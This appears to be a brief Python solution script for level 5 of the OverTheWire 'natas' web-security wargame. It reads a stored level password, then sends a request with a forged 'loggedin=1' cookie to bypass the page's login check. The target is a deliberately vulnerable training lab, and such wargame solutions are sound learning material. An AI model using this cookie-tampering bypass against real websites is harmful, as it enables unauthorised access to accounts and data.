"""
Help script to resolve natas challenge #5
"""
import requests
import json

level = 'natas5'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
Just manipulate the cookie to change loggedin from 0 to 1.
"""
response = requests.get(url, auth=auth, cookies={'loggedin': '1'})
print(response.text)
